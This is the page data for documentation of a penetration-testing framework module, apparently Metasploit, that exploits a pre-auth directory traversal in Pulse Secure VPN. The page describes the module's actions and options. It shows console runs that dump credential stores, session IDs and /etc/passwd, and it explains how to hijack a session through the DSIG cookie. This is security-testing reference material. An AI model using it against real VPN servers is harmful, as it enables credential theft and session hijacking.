{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/pulse_secure_file_disclosure","result":{"data":{"moduleMetadataJson":{"id":"e6ef7535-3e4f-5068-9932-4cc99a325e3d","name":"Pulse Secure VPN Arbitrary File Disclosure","fullname":"auxiliary/gather/pulse_secure_file_disclosure","description":"This module exploits a pre-auth directory traversal in the Pulse Secure\n        VPN server to dump an arbitrary file. Dumped files are stored in loot.\n\n        If the \"Automatic\" action is set, plaintext and hashed credentials, as\n        well as session IDs, will be dumped. Valid sessions can be hijacked by\n        setting the \"DSIG\" browser cookie to a valid session ID.\n\n        For the \"Manual\" action, please specify a file to dump via the \"FILE\"\n        option. /etc/passwd will be dumped by default. If the \"PRINT\" option is\n        set, file contents will be printed to the screen, with any unprintable\n        characters replaced by a period.\n\n        Please see related module exploit/linux/http/pulse_secure_cmd_exec for\n        a post-auth exploit that can leverage the results from this module.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/pulse_secure_file_disclosure","documentationSlug":"/modules/documentation/auxiliary/gather/pulse_secure_file_disclosure","referencesSlug":"/modules/references/auxiliary/gather/pulse_secure_file_disclosure"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a pre-auth directory traversal in the Pulse Secure\nVPN server to dump an arbitrary file. Dumped files are stored in loot.</p>\n<p>If the <code class=\"language-text\">Automatic</code> action is set, plaintext and hashed credentials, as\nwell as session IDs, will be dumped. Valid sessions can be hijacked by\nsetting the <code class=\"language-text\">DSIG</code> browser cookie to a valid session ID.</p>\n<p>For the <code class=\"language-text\">Manual</code> action, please specify a file to dump via the <code class=\"language-text\">FILE</code>\noption. <code class=\"language-text\">/etc/passwd</code> will be dumped by default. If the <code class=\"language-text\">PRINT</code> option is\nset, file contents will be printed to the screen, with any unprintable\ncharacters replaced by a period.</p>\n<p>Please see related module exploit/linux/http/pulse<em>secure</em>cmd_exec for\na post-auth exploit that can leverage the results from this module.</p>\n<h2 id=\"actions\" style=\"position:relative;\"><a href=\"#actions\" aria-label=\"actions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Actions</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Name       Description\n----       -----------\nAutomatic  Dump creds and sessions\nManual     Dump an arbitrary file (FILE option)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>FILE</strong></p>\n<p>Set this to the file you want to dump. The default is <code class=\"language-text\">/etc/passwd</code>.\nValid only in manual mode.</p>\n<p><strong>PRINT</strong></p>\n<p>Whether to print file contents to the screen. Valid only in manual mode.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>Dumping creds and sessions in automatic mode:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(gather/pulse_secure_file_disclosure) &gt; run\n[*] Running module against [redacted]\n\n[*] Running in automatic mode\n[*] Dumping /data/runtime/mtmp/lmdb/dataa/data.mdb\n[+] /Users/wvu/.msf4/loot/20191029221840_default_[redacted]_PulseSecureVPN_273470.mdb\n[*] Dumping /data/runtime/mtmp/lmdb/randomVal/data.mdb\n[*] Parsing session IDs...\n[+] Session ID found: df502e6052d9002d8f02160af8bfd055\n[+] Session ID found: 249b470bd9bd1983f721ca950a74e61c\n[+] Session ID found: acbef5625\n[+] Session ID found: c145e683a\n[+] Session ID found: fc6c097dd\n[+] Session ID found: 249b470bd9bd1983f721ca950a74e61c\n[+] Session ID found: c145e683a17cfacb72a47eb8b2515c14\n[+] Session ID found: a7661751393e16fa253e97bd02dc2a4f\n[+] Session ID found: 7e78ab276afea3f00dfa41892c437156c699eff8\n[+] /Users/wvu/.msf4/loot/20191029221845_default_[redacted]_PulseSecureVPN_607925.mdb\n[*] Dumping /data/runtime/mtmp/system\n[+] /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin\n[*] Auxiliary module execution completed\nmsf5 auxiliary(gather/pulse_secure_file_disclosure) &gt; loot\n\nLoot\n====\n\nhost         service  type                                        name                                        content                   info                   path\n----         -------  ----                                        ----                                        -------                   ----                   ----\n[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/lmdb/dataa/data.mdb      application/octet-stream  Plaintext credentials  /Users/wvu/.msf4/loot/20191029221840_default_[redacted]_PulseSecureVPN_273470.mdb\n[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/lmdb/randomVal/data.mdb  application/octet-stream  Session IDs            /Users/wvu/.msf4/loot/20191029221845_default_[redacted]_PulseSecureVPN_607925.mdb\n[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/system                   application/octet-stream  Hashed credentials     /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin\n\nmsf5 auxiliary(gather/pulse_secure_file_disclosure) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Dumping default <code class=\"language-text\">/etc/passwd</code> in manual mode:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(gather/pulse_secure_file_disclosure) &gt; set action Manual\naction =&gt; Manual\nmsf5 auxiliary(gather/pulse_secure_file_disclosure) &gt; run\n[*] Running module against [redacted]\n\n[*] Running in manual mode\n[*] Dumping /etc/passwd\nroot:x:0:0:root:/:/bin/bash\nnfast:x:0:0:nfast:/:/bin/bash\nbin:x:1:1:bin:/:\nnobody:x:99:99:Nobody:/:\ndns:x:98:98:DNS:/:\nterm:x:97:97:Telnet/SSH:/:\nweb80:x:96:96:Port 80 web:/:\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\npostgres:x:102:102:PostgreSQL User:/:\n\n[+] /Users/wvu/.msf4/loot/20191029222949_default_[redacted]_PulseSecureVPN_073170.bin\n[*] Auxiliary module execution completed\nmsf5 auxiliary(gather/pulse_secure_file_disclosure) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e6ef7535-3e4f-5068-9932-4cc99a325e3d"}}}